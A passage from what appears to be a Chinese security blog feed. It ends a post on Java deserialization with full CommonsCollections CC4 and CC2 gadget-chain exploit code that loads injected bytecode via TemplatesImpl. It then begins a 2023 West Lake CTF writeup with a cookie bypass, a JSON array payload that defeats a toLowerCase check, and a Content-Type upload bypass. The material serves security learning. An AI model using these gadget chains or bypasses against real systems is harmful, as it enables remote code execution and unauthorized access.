class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodeField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://tmp/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodeField.set(templates,codes);<br><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>            instantiateTransformer&#125;;<br><br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformField.set(transformingComparator,transformerChain);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(exp);<br>        oos.writeObject(priorityQueue);<br>        <span class="hljs-comment">// oos.writeObject(finalEvilHandler);</span><br>        oos.flush();<br>        oos.close();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(exp.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(out);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><p>大致和cc4相同：</p><h2 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.testlearning;<br><br><br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.*;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TrAXFilter;<br><br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc2Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodeField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://tmp/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodeField.set(templates,codes);<br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformField.set(transformingComparator,invokerTransformer);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(exp);<br>        oos.writeObject(priorityQueue);<br>        <span class="hljs-comment">// oos.writeObject(finalEvilHandler);</span><br>        oos.flush();<br>        oos.close();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(exp.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(out);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>利用InvokerTransformer获取到newTransformer ， 然后调用TemplatesImpl的newTransformer，<br>问题是如何传入 templates 对象：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc68.png" class="" title="pc68"><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc69.png" class="" title="pc69"><p>x是templates对象</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc70.png" class="" title="pc70"><p>继续跟：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc71.png" class="" title="pc71"><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc72.png" class="" title="pc72"><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc73.png" class="" title="pc73"><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc74.png" class="" title="pc74"><p>invoke templates对象的</p><p>newTransformer 后面就跟cc3一样了</p><h1 id="版本相关"><a href="#版本相关" class="headerlink" title="版本相关"></a>版本相关</h1><p>1、3、5、6、7是Commons Collections&lt;&#x3D;3.2.1中存在的反序列化链。<br>2、4是Commons Collections 4.0以上中存在的反序列化链。<br>同时还对JDK的版本有要求，这里使用的测试版本为1.7和1.8</p><p>完结撒花！</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>西湖论剑2023writeup</title>
    <link href="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/"/>
    <url>/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="Node-Magical-Login"><a href="#Node-Magical-Login" class="headerlink" title="Node Magical Login"></a>Node Magical Login</h1><p>打开题目环境只有一个登陆框</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc1.png" class="" title="pc1"><p>比赛的时候提供了源码：</p><p>用node.js搭建起来的网站</p><p>main.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>)<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>)<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;cookie-parser&quot;</span>);<br><span class="hljs-keyword">const</span> controller = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./controller&quot;</span>)<br><br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = <span class="hljs-title class_">Number</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span>) || <span class="hljs-number">80</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">HOST</span> = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br><br><br><br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123;<span class="hljs-attr">extended</span>:<span class="hljs-literal">false</span>&#125;))<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>())<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>())<br><br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;static&#x27;</span>))<br><br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/login&quot;</span>,<span class="hljs-function">(<span class="hljs-params">req,res</span>) =&gt;</span> &#123;<br>    controller.<span class="hljs-title class_">LoginController</span>(req,res)<br>&#125;)<br><br><br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname,<span class="hljs-string">&quot;static/index.html&quot;</span>)<br>&#125;)<br><br><br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/flag1&quot;</span>,<span class="hljs-function">(<span class="hljs-params">req,res</span>) =&gt;</span> &#123;<br>    controller.<span class="hljs-title class_">Flag1Controller</span>(req,res)<br>&#125;)<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/flag2&quot;</span>,<span class="hljs-function">(<span class="hljs-params">req,res</span>) =&gt;</span> &#123;<br>    controller.<span class="hljs-title class_">CheckInternalController</span>(req,res)<br>&#125;)<br><br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/getflag2&quot;</span>,<span class="hljs-function">(<span class="hljs-params">req,res</span>)=&gt;</span> &#123;<br>    controller.<span class="hljs-title class_">CheckController</span>(req,res)<br>&#125;)<br><br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>,<span class="hljs-variable constant_">HOST</span>,<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server is listening on Host <span class="hljs-subst">$&#123;HOST&#125;</span> Port <span class="hljs-subst">$&#123;PORT&#125;</span>.`</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>controller.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SECRET_COOKIE</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">SECRET_COOKIE</span> || <span class="hljs-string">&quot;this_is_testing_cookie&quot;</span><br><br><br><span class="hljs-keyword">const</span> flag1 = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&quot;/flag1&quot;</span>)<br><span class="hljs-keyword">const</span> flag2 = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&quot;/flag2&quot;</span>)<br><br><br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">LoginController</span>(<span class="hljs-params">req,res</span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span><br>        <span class="hljs-keyword">const</span> password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span><br>        <span class="hljs-keyword">if</span> (username !== <span class="hljs-string">&quot;admin&quot;</span> || password !== <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>().<span class="hljs-title function_">toString</span>()) &#123;<br>            res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;text/html&quot;</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Login Failed&quot;</span>)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-variable constant_">SECRET_COOKIE</span>)<br>            res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/flag1&quot;</span>)<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (__) &#123;&#125;<br>&#125;<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CheckInternalController</span>(<span class="hljs-params">req,res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(<span class="hljs-string">&quot;check.html&quot;</span>,&#123;<span class="hljs-attr">root</span>:<span class="hljs-string">&quot;static&quot;</span>&#125;)<br><br><br>&#125;<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CheckController</span>(<span class="hljs-params">req,res</span>) &#123;<br>    <span class="hljs-keyword">let</span> checkcode = req.<span class="hljs-property">body</span>.<span class="hljs-property">checkcode</span>?req.<span class="hljs-property">body</span>.<span class="hljs-property">checkcode</span>:<span class="hljs-number">1234</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">body</span>)<br>    <span class="hljs-keyword">if</span>(checkcode.<span class="hljs-property">length</span> === <span class="hljs-number">16</span>)&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            checkcode = checkcode.<span class="hljs-title function_">toLowerCase</span>()<br>            <span class="hljs-keyword">if</span>(checkcode !== <span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span>)&#123;<br>                res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123;<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;Invalid Checkcode1:&quot;</span> + checkcode&#125;)<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (__) &#123;&#125;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;text/html&quot;</span>).<span class="hljs-title function_">json</span>(&#123;<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;You Got Another Part Of Flag: &quot;</span> + flag2.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">trim</span>()&#125;)<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;text/html&quot;</span>).<span class="hljs-title function_">json</span>(&#123;<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;Invalid Checkcode2:&quot;</span> + checkcode&#125;)<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Flag1Controller</span>(<span class="hljs-params">req,res</span>)&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">user</span> === <span class="hljs-variable constant_">SECRET_COOKIE</span>)&#123;<br>            res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&quot;This_Is_The_Flag1&quot;</span>,flag1.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">trim</span>())<br>            res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&quot;This_Is_The_Flag2&quot;</span>,flag2.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">trim</span>())<br>            res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;text/html&quot;</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Login success. Welcome,admin!&quot;</span>)<br>        &#125;<br>        <span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">user</span> === <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>            res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&quot;This_Is_The_Flag1&quot;</span>, flag1.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">trim</span>())<br>            res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;text/html&quot;</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;You Got One Part Of Flag! Try To Get Another Part of Flag!&quot;</span>)<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;text/html&quot;</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Unauthorized&quot;</span>)<br>        &#125;<br>    &#125;<span class="hljs-keyword">catch</span> (__) &#123;&#125;<br>&#125;<br><br><br><br><br><br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-title class_">LoginController</span>,<br>    <span class="hljs-title class_">CheckInternalController</span>,<br>    <span class="hljs-title class_">Flag1Controller</span>,<br>    <span class="hljs-title class_">CheckController</span><br>&#125;<br></code></pre></td></tr></table></figure><p>通过阅读源码可以看到flag被分为两部分，其中flag1 只需要设置一下cookie即可</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc2.png" class="" title="pc2"><p>cookie: user&#x3D;admin</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc3.png" class="" title="pc3"><p>访问 &#x2F;flag2</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc4.png" class="" title="pc4"><p>checkcode要经过，经过toLowerCase处理过后，还要有大写。这里猜测这个toLowerCase不能处理数组格式。</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc5.png" class="" title="pc5"><p>payload:注意aGr5AtSp55dRacer要重复16次，要不然直接会返回checkcode长度不够长的情况</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;checkcode&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;aGr5AtSp55dRacer&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc6.png" class="" title="pc6"><h1 id="扭转乾坤"><a href="#扭转乾坤" class="headerlink" title="扭转乾坤"></a>扭转乾坤</h1><p>随便上传一个文件，返回”Sorry,Apache maybe refuse header equals Content-Type: multipart&#x2F;form-data;”</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc7.png" class="" title="pc7"><p>那就改为Multipart&#x2F;form-data;</p><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc8.png" class="" title="pc8"><h1 id="easy-api"><a href="#easy-api" class="headerlink" 